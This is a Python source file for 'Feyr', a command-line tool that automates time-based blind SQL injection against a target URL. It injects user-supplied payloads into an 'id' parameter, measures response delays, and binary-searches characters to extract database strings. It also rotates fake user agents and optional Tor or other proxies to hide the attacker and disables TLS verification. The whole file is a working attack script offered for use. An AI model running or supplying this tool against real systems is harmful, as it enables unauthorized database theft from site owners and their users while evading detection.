#!/usr/bin/python
from concurrent.futures import ThreadPoolExecutor
import threading
import requests
import time
import string
import argparse
import random
import pyfiglet
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Fake user agents
f_users = [
        "Mozilla/5.0 (Windows NT 10.0; Win 64; x64) AppleWebKit/567.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 SaSafari/604.1",
        "Mozilla/5.0 (x11; Linux x86_640 AppleWebKit/537.36 (KHTML, like Gecho) Chrome 119.0.0.0 Safari/537.36",
        ]

proxies = [
#        "socks5h://127.0.0.1:9050", #Tor
#        "http://127.0.0.1:8080", #BurpSuite
        ]

parser = argparse.ArgumentParser(
        prog = 'Feyr',
        description = 'Automate the process of a blind SQLi',
        epilog = 'Example: '
        )

# Arguments
#Necesary arguments
parser.add_argument('-u','--url', help='SQLi objective page', required = True)
parser.add_argument('-i','--injection', help='SQL injection code', required = True)

# Optional arguments
parser.add_argument('-c', '--Cookie', help='Cookie session')
parser.add_argument('-t', '--Threads', type=int, default=1 ,help ='Set how many threads are working at the same time (Only works on search Default 1)')

subparsers = parser.add_subparsers(dest='system', required=True)
dump_parser = subparsers.add_parser('function')

dump_parser.add_argument('-l', '--length_val', type=int, help='Length value for the search function')

dump_group = dump_parser.add_mutually_exclusive_group(required=True)
dump_group.add_argument('--search', action='store_true',help = 'Search the char of anything')
dump_group.add_argument('--length', action='store_true',help = "Gets the length (Add '{number} for the loop')")

args = parser.parse_args()
timing = threading.Lock()
session = requests.Session()

class StealthManager:
    @staticmethod
    def get_identity():
        headers = {"User-Agent": random.choice(f_users)}
        proxy = random.choice(proxies) if proxies else None
        return headers, {"http": proxy, "https": proxy} if proxy else None

def cookie_dict(cookie):
    if not cookie:
        return None

    try:
        return {k.strip(): v for k, v in (item.split('=') for item in cookie.split(';'))}
    except ValueError:
        print("Cookie format: 'x=var1; y=var2; z=var3'")

def main():
    if args.system == 'function':
        if args.length:
            cal_num()
        elif args.search:
            print(search())

def  connection():
    cookies = cookie_dict(args.Cookie)
    if cookies:
        session.cookies.update(cookies)
    
    try:
        r = session.get(url=args.url, params={'id':1, 'Submit':'Submit'})

        if r.status_code == 200:
            print(f"{r}, connection established")
            return True
    except Exception as e:
        print(f"{r}, connection failed: {e}")
        return False

def char_search(query, pos):
    chars = sorted(string.printable.strip())
    start = 32
    end = 126
    char = "?"

    url = args.url

    while start <= end:
        half = (start+end)//2

        injection = args.injection.replace("{pos}", str(pos)).replace("{val}", str(half))

        if delay(url, injection):
            start = half + 1
        else:
            char = chr(half)
            end = half - 1
    return char


def search():
    word = {i: "_" for i in range(1, args.length_val + 1)}
    print("Starting Dump Process")

    with ThreadPoolExecutor(max_workers=args.Threads) as executor:
        futures = {executor.submit(char_search, args.injection, i): i for i in range(1, args.length_val+1)}
        time.sleep(0.5)


        for future in futures:
            position = futures[future]
            try:
                character = future.result()
                word[position] = character

                progress = "".join([word[i] for i in range(1, args.length_val+1)])
                print(f"\r[>] Progress {progress}", end="", flush=True)

            except Exception as e:
                word[position] = "?"

    final_word = "".join([word[i] for i in range (1, args.length_val+1)])
    print(f"Process finish \nstring found: {final_word}")

    return final_word

def cal_num():
    number = 1
    arg_cookie = args.Cookie
    cookie = cookie_dict(arg_cookie)
    url = args.url
    args_injection = args.injection

    while number < 100:
        injection = args_injection.replace("{number}", str(number))

        if delay(url, injection):
            print(f"Identified: {number}")
            return number
        print(number)
        number += 1
    return 0

def delay(url, injection, retries=2):
    for attempt in range(retries + 1):
        headers, proxys = StealthManager.get_identity()

        try:

            with timing:
                start_time = time.time()

                if proxys:
                    session.get(
                            url,
                            params={'id':injection, 'Submit':'Submit'},
                            headers=headers,
                            proxies=proxys,
                            timeout=25,
                            verify=False
                            )
                else:
                    session.get(
                            url,
                            params={'id':injection, 'Submit':'Submit'},
                            timeout=25,
                            verify=False
                            )


                duration = time.time() - start_time

            return duration >= 0.5

        except Exception as e:
            print(f"Error: {e}")
            return False

def identity():
    print("Verifying identity connection")
    header, proxys = StealthManager.get_identity()

    try:
        r = requests.get("https://api.apify.org?format=json", proxies=proxys, timeout=20, verify=False)
        print(f"Proxy active. IP: {r.json()['IP']}")
        return True
    except Exception as e:
        print(e)
        print("Proxy failed")
        return False

def banner():
    banner = pyfiglet.figlet_format("Feyr", font="slant")
    print(banner)

if __name__ == "__main__":
    if connection():
#        identity()
        banner()
        main()
